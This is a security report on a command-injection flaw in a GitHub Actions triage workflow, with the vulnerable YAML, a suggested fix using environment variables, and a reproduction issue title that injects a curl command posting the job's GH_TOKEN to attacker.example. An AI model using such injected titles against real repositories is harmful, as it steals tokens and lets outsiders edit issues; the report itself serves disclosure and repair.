# Security report: command injection in `triage.yml`

Reported through the repository's private vulnerability reporting. Severity: high.

## What is vulnerable

`.github/workflows/triage.yml` on `main`:

```yaml
name: triage
on:
  issues:
    types: [opened]
permissions:
  issues: write
jobs:
  triage:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "New issue: ${{ github.event.issue.title }}"
          gh issue edit ${{ github.event.issue.number }} --add-label triage
        env:
          GH_TOKEN: ${{ github.token }}
          GH_REPO: ${{ github.repository }}
```

## How to reproduce

Open an issue, as any GitHub user, titled:

```
x"; curl -sS https://attacker.example/c -d "$GH_TOKEN"; echo "
```

GitHub substitutes every `${{ }}` expression into the script text before the shell starts,
so the shell runs `echo "New issue: x"`, then the attacker's `curl`, which posts the job's
token to a server they control. The token can edit every issue in the repository until the
job ends.

## Suggested fix

Never write an expression that holds user input inside `run`. Pass it through `env`, and let
the shell read it as a variable, quoted: a variable's value is data, and the shell never parses
it as code.
